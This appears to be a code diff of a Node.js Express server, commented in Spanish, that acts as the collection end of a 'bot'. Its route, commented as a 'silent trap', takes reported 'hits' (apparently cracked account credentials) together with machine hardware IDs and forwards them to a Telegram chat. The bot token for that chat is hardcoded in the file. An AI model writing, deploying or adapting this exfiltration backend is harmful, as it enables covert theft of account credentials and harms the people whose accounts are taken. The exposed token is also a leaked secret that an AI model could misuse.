@@ -3,7 +3,7 @@ const axios = require('axios');
 const path = require('path');
 const app = express();
 
-// IMPORTANTE: Esto permite que el servidor lea los datos que envía el bot
+// Permite leer los datos JSON enviados por el bot
 app.use(express.json());
 
 const TELEGRAM_TOKEN = '8753363173:AAETIidwUu0M1hPYXOGPswuvBclTsRnVZ6g';
@@ -17,27 +17,27 @@ async function enviarTelegram(mensaje) {
             text: mensaje,
             parse_mode: 'Markdown'
         });
-        console.log("✅ Mensaje enviado a Telegram");
+        console.log("✅ Mensaje reenviado a Telegram");
     } catch (e) {
-        console.log("❌ Error en Telegram:", e.response ? e.response.data : e.message);
+        console.log("❌ Error en Telegram API:", e.response ? e.response.data : e.message);
     }
 }
 
+// Ruta para licencias
 app.get('/lista_blanca.txt', (req, res) => {
     res.sendFile(path.join(__dirname, 'lista_blanca.txt'));
 });
 
+// Ruta de la trampa silenciosa
 app.post('/api/v1/sync', async (req, res) => {
-    // Log para ver en Render qué está llegando
-    console.log("📥 Datos recibidos del bot:", req.body);
-
+    console.log("📥 Recibido del bot:", req.body);
     const { tipo, hwid, data, fecha } = req.body;
 
     let mensajeTelegram = "";
     if (tipo === "HIT_ENCONTRADO") {
         mensajeTelegram = `🔥 *¡NUEVO HIT DETECTADO!* 🔥\n\n👤 *Cuenta:* \`${data}\`\n🆔 *PC:* ${hwid}\n📅 *Fecha:* ${fecha}`;
     } else {
-        mensajeTelegram = `⚠️ *AVISO:* ${tipo}\n🆔 *HWID:* ${hwid}\n📝 *Info:* ${data}`;
+        mensajeTelegram = `⚠️ *AVISO SISTEMA:* ${tipo}\n🆔 *HWID:* ${hwid}\n📝 *Info:* ${data}`;
     }
 
     await enviarTelegram(mensajeTelegram);
@@ -46,5 +46,5 @@ app.post('/api/v1/sync', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log("🚀 Servidor Maestro Titán Online y vinculado a Telegram");
+    console.log("🚀 Servidor Maestro Titán Online conectado a Telegram");
 });
